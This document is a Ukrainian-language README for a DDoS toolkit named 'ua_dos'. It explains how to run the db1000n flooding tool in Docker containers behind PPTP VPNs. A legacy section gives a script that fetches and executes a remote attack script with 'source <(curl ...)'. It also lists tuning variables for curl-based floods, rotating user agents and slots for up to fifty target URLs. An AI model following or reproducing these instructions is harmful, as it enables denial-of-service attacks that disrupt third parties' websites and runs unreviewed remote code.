# ua_dos
## Docker
Всередині докера запускається pptp vpn з'єднання та бінарник db1000n проекту https://github.com/Arriven/db1000n.
Треба створити файли конфігурації pptp в діректорії: `ansible/confign/files/vpn1...*` і файл паролів `ansible/confign/files/chap-secrets`.

Приклад файлу `vpn1`:
```
pty "/usr/sbin/pptp hostvpn1 --loglevel 0 --nolaunchpppd"
lock
noauth
nobsdcomp
nodeflate
name uservpn1
remotename vpn1
ipparam vpn1
persist
maxfail 0
holdoff 10
```
Тут задаються: `hostvpn1` - IP адреса, або домен vpn серверу; `uservpn1` - ім'я користувача pptp підключення; `vpn1` - назва vpn підключення.

Приклад файлу `chap-secrets`:
```
# Secrets for authentication using CHAP
# client        server  secret                  IP addresses
uservpn1 vpn1 "passwordvpn1" *
...
uservpn* vpn* "passwordvpn*" *
```
Тут задаються:`uservpn1` - ім'я користувача pptp підключення;`passwordvpn1` - пароль pptp підключення; `vpn1` - назва vpn підключення.

При збиранні image ці файли забираються всередину.

Збирається image командою:
```
docker image build --force-rm -t ua_dos:0.1 .
```
Де `ua_dos:0.1` - назва і версія імеджа, який буде створений.

Після чого треба створити network ipvlan типу за допомогою команди:
```
docker network  create -d ipvlan --subnet=192.168.0.0/24 -o parent=wlo1 gwnet
```
Тут `192.168.0.0/24` - мережа, яку роздає wifi роутер (За допомогою якій хостова машина підключена до інтернету); `wlo1` - назва wifi інтерфейсу в ноутбуці (На якому вище вказана мережа від роутеру); `gwnet` - назва новоствореної мережі docker.
Цю інформацію можна подивитись у вихлопі команди `ifconfig` на хостовій машині (В даному випадку ноутбук).

Запуск контейнера можна здійснювати двума способами:
 1. В інтерактивному режимі:
```
docker run --restart unless-stopped --privileged --net=gwnet --name node1 --hostname node1 --ip 192.168.0.x -it ua_dos:0.1 vpn1
```
 2. В режимі демона:
```
docker run --restart unless-stopped --privileged --net=gwnet --name node2 --hostname node2 --ip 192.168.0.x -d ua_dos:0.1 vpn2
```
Де `vpn1` - назва vpn підключення, яке буде ініційоване при запуску контейнера. `--ip 192.168.0.x` - IP адреса, яка буде привласнена запускаємому контейнеру (Повинен бути із раніше створеної мережі `--subnet=192.168.0.0/24`)
До нод можна підключатися по ssh, тільки по ключу, який кладеться в діректорію `ssh`, і має називатись `id_rsa.pub`. Парольна авторизація відключена.

## Legacy
Атака `ntct` занедбана, с `curl-atack` можна працювати.

1. Створи файл з будь-якою назвою *(Наприклад: "curl-atack")*.
2. Запиши в файл два рядка:
```
#!/bin/bash
source <(curl -Ls https://raw.githubusercontent.com/bro2020/ua_dos/main/curl-atack)
```
3. Зроби файл виконуваним, запустивши команду:
```
chmod +x "назва файлу"
(Наприклад: chmod +x curl-atack)
```
4. Запусти файл:
```
./"назва файлу"
(Наприклад: ./curl atack)
```
Завантаження таргетів пішло, і через декілька секунд відобразиться інформація, яка буде оновлюватись.

Для зупинки - на клавіатурі зажати `Ctrl+C`. При цьому завершаться **ВСІ** процеси curl запущені в операційній системі!

Якщо хочеш перевизначити параметри, для збільшення/зменшення інтенсивності і/або збільшення/зменшення навантаження на обладнання ...

1. Створи файл `curl-atack-env.txt`
2. Запиши в нього наступні рядки:
```
rcount=$((RANDOM%10+7)) # кількість ітерацій, після якої примусово завершаються процеси curl
sq1=$((RANDOM%3+1)) # кількість паралельно виконуваних циклів
sq2=$((RANDOM%3+2)) # кількість прогонів в кажному із паралельних циклів (1 ітерація)
t1=$((RANDOM%7+7)) # таймают перед примусовим завершенням процесів curl)
t2=$((RANDOM%2+1)) # таймаут(швидкість) запуску проходів в паралельно виконуваних циклах
t3=$((RANDOM%3+1)) # таймаут післе завершення всіх проходів в паралельних циклах
t4='15' # таймаут автоматичного неперервного завершення процесів curl в кажному проході

UA1='Mozilla/5.0 (Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36'
UA2='Mozilla/5.0 (Macintosh; Intel Mac OS X 12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36'
UA3='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36'
UA4='Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.78 Mobile Safari/537.36'
UA5='Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0'
```
3. Міняй їх на свій смак. Сюди ж можна вписати свої таргети у вигляді завдання змінних:
```
H1='http://target.ru'
...
H50='https://target.ru'
```
